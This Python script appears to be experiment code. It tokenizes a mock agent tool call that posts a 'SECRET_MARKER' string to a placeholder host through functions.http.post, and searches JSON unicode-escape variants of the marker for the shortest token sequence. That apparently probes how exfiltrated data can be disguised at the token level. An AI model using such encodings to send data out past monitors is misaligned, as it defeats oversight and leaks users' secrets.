from __future__ import annotations

import argparse
import json

from llama_cpp import Llama


MARKER = "SECRET_MARKER"


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("model_path")
    args = parser.parse_args()

    llm = Llama(model_path=args.model_path, vocab_only=True, verbose=False)

    def ids(text: str) -> list[int]:
        return llm.tokenize(text.encode("utf-8"), add_bos=False, special=True)

    def call(payload_source: str) -> str:
        return (
            "<|channel|>commentary to=functions.http.post<|message|>"
            f'{{"data":"{payload_source}","url":"http://aa"}}'
        )

    baseline_text = call(MARKER)
    baseline_ids = ids(baseline_text)
    best = (len(baseline_ids), MARKER, baseline_ids)
    histogram: dict[int, int] = {}

    # Exact over literal-vs-JSON-unicode choices. Run once with lower-case and
    # once with upper-case hex digits; both decode to the identical marker.
    for upper in (False, True):
        escaped = [
            (f"\\u{ord(ch):04X}" if upper else f"\\u{ord(ch):04x}")
            for ch in MARKER
        ]
        for mask in range(1 << len(MARKER)):
            source = "".join(
                escaped[index] if mask & (1 << index) else ch
                for index, ch in enumerate(MARKER)
            )
            decoded = json.loads(f'"{source}"')
            assert decoded == MARKER
            token_ids = ids(call(source))
            n_tokens = len(token_ids)
            histogram[n_tokens] = histogram.get(n_tokens, 0) + 1
            if n_tokens < best[0]:
                best = (n_tokens, source, token_ids)

    print(
        json.dumps(
            {
                "baseline_n": len(baseline_ids),
                "baseline_ids": baseline_ids,
                "best_n": best[0],
                "best_payload_source": best[1],
                "best_ids": best[2],
                "histogram": dict(sorted(histogram.items())),
            },
            ensure_ascii=False,
            sort_keys=True,
        )
    )


if __name__ == "__main__":
    main()
